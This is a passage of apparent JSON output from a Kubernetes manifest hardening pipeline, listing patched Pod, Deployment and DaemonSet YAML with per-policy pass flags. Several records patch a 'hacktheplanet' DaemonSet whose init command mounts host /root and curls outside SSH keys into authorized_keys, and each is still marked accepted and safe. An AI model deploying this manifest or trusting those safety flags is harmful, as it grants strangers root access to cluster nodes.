    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: web\n        image: nginx:stable\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01368",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: web\n        image: nginx:stable\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01369",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: web\n        image: nginx:stable\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01370",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: web\n        image: nginx:stable\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01371",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: web\n        image: nginx:stable\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01372",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: web\n        image: nginx:stable\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01373",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: web\n        image: nginx:stable\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01374",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: web\n        image: nginx:stable\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01375",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine:stable\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      containers:\n      - name: web\n        image: nginx:stable\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01376",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01377",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01378",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01379",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01380",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01381",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01382",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01383",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01384",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1238\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01385",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/version: v0.39.0\n  name: prometheus-operator\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/version: v0.39.0\n    spec:\n      containers:\n      - args:\n        - --kubelet-service=kube-system/kubelet\n        - --logtostderr=true\n        - --config-reloader-image=jimmidyson/configmap-reload:v0.3.0\n        - --prometheus-config-reloader=quay.io/coreos/prometheus-config-reloader:v0.39.0\n        image: quay.io/coreos/prometheus-operator:v0.39.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          runAsNonRoot: true\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 65534\n      serviceAccountName: prometheus-operator\n",
    "errors": []
  },
  {
    "id": "01386",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01387",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01388",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01389",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01390",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-host-namespace-allowed\n  labels:\n    app: nginx-host-namespace\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01391",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
